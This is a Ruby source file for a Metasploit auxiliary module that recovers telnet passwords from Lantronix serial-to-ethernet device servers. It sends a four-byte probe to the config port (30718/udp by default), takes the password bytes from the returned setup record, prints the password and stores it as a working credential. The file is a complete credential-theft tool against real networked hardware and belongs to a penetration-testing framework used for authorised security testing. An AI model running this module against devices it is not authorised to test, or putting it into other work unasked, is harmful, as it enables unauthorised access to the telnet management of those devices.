##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Lantronix Telnet Password Recovery',
      'Description' => %q{
          This module retrieves the setup record from Lantronix serial-to-ethernet
        devices via the config port (30718/udp, enabled by default) and extracts the
        telnet password. It has been tested successfully on a Lantronix Device Server
        with software version V5.8.0.1.
      },
      'Author'      => 'jgor',
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::CHOST,
        Opt::RPORT(30718),
        OptBool.new('CHECK_TCP', [false , 'Check TCP instead of UDP', false])
      ])
  end

  def run_host(ip)
    setup_probe = "\x00\x00\x00\xF8"
    password = nil

    begin
      sock_opts = {
        'LocalHost' => datastore['CHOST'] || nil,
        'PeerHost'  => ip,
        'PeerPort'  => datastore['RPORT'],
        'Context'   =>  {
          'Msf' => framework,
          'MsfExploit' => self
        }
      }
      if datastore['CHECK_TCP']
        vprint_good("Checking Lantronix TCP Socket #{datastore['RPORT']} on #{ip}")
        rem_sock = Rex::Socket::Tcp.create(sock_opts)
      else
        # Create an unbound UDP socket if no CHOST is specified, otherwise
        # create a UDP socket bound to CHOST (in order to avail of pivoting)
        vprint_good("Checking Lantronix UDP Socket #{datastore['RPORT']} on #{ip}")
        rem_sock = Rex::Socket::Udp.create(sock_opts)
      end
      rem_sock.put(setup_probe)
      res = rem_sock.recvfrom(65535, 0.5) and res[1]

      password = parse_reply(res)
    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError
      print_error("Connection error")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
    ensure
      rem_sock.close if rem_sock
    end

    if password
      if password == "\x00\x00\x00\x00"
        print_status("#{rhost} - Password isn't used, or secure")
      else
        print_good("#{rhost} - Telnet password found: #{password.to_s}")

        service_data = {
          address: ip,
          port: 9999,
          service_name: 'telnet',
          protocol: 'tcp',
          workspace_id: myworkspace_id
        }

        credential_data = {
          module_fullname: self.fullname,
          origin_type: :service,
          private_data: password.to_s,
          private_type: :password
        }.merge(service_data)

        credential_core = create_credential(credential_data)

        login_data = {
          core: credential_core,
          last_attempted_at: DateTime.now,
          status: Metasploit::Model::Login::Status::SUCCESSFUL
        }.merge(service_data)

        create_credential_login(login_data)
      end
    end
  end

  def parse_reply(pkt)
    setup_record = pkt[0]

    # If response is a setup record, extract password bytes 13-16
    if setup_record[3] and setup_record[3].ord == 0xF9
      return setup_record[12,4]
    else
      return nil
    end
  end
end
